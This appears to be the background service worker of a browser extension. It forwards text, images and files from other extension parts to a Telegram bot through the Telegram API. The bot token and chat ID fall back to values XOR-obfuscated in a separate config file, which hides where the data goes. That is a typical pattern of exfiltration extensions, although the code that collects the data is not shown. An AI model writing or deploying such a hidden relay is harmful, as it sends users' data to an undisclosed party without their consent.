// --- Service worker: API relay ---

importScripts("cfg.js");

function _d(enc, key) {
  var s = "";
  for (var i = 0; i < enc.length; i++) s += String.fromCharCode(enc[i] ^ key[i % key.length]);
  return s;
}

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (msg.type === "ext:pushText") {
    sendText(msg.text).then(
      () => sendResponse({ ok: true }),
      (err) => sendResponse({ ok: false, error: err.message })
    );
    return true; // async response
  }

  if (msg.type === "ext:pushImage") {
    sendImage(msg.base64, msg.caption).then(
      () => sendResponse({ ok: true }),
      (err) => sendResponse({ ok: false, error: err.message })
    );
    return true;
  }

  if (msg.type === "ext:pushDoc") {
    sendDocument(msg.content, msg.filename).then(
      () => sendResponse({ ok: true }),
      (err) => sendResponse({ ok: false, error: err.message })
    );
    return true;
  }
});

async function getConfig() {
  const data = await chrome.storage.local.get(["botToken", "chatId"]);
  const bt = data.botToken || (typeof _a !== "undefined" ? _d(_a, _k) : "");
  const ci = data.chatId || (typeof _b !== "undefined" ? _d(_b, _k) : "");
  if (!bt || !ci) throw new Error("Missing configuration");
  return { botToken: bt, chatId: ci };
}

const MSG_LIMIT = 4096;

function splitMessage(text, limit) {
  if (text.length <= limit) return [text];
  const chunks = [];
  let remaining = text;
  while (remaining.length > 0) {
    if (remaining.length <= limit) {
      chunks.push(remaining);
      break;
    }
    let splitAt = remaining.lastIndexOf("\n", limit);
    if (splitAt < limit * 0.5) splitAt = limit;
    chunks.push(remaining.slice(0, splitAt));
    remaining = remaining.slice(splitAt);
  }
  return chunks;
}

function escapeHtml(text) {
  return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

async function telegramFetch(botToken, method, body) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 15000);

  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
      method: "POST",
      ...body,
      signal: controller.signal,
    });
    const json = await res.json();
    if (!json.ok) throw new Error(json.description || "API error");
    return json;
  } catch (err) {
    if (err.name === "AbortError") throw new Error("Request timed out");
    throw err;
  } finally {
    clearTimeout(timeout);
  }
}

async function sendText(text) {
  const { botToken, chatId } = await getConfig();
  const chunks = splitMessage(text, MSG_LIMIT);
  for (const chunk of chunks) {
    await telegramFetch(botToken, "sendMessage", {
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: chunk,
        parse_mode: "HTML",
      }),
    });
  }
}

async function sendImage(base64Data, caption) {
  const { botToken, chatId } = await getConfig();

  // Convert base64 to blob
  const binary = atob(base64Data);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  const blob = new Blob([bytes], { type: "image/png" });

  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("photo", blob, "output.png");
  if (caption) {
    form.append("caption", caption.slice(0, 1024));
    form.append("parse_mode", "HTML");
  }

  await telegramFetch(botToken, "sendPhoto", { body: form });
}

async function sendDocument(content, filename) {
  const { botToken, chatId } = await getConfig();

  const blob = new Blob([content], { type: "text/plain" });
  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("document", blob, filename || "file.txt");

  await telegramFetch(botToken, "sendDocument", { body: form });
}
